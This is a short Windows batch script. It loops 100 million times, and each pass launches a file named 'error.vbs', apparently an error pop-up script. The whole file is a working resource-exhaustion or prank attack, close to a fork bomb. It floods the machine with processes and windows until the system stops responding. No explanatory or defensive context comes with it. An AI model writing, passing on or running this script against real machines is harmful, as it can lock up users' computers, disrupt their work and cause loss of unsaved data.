@echo off
for /L %%b in (1,1,100000000) do (
start error.vbs
)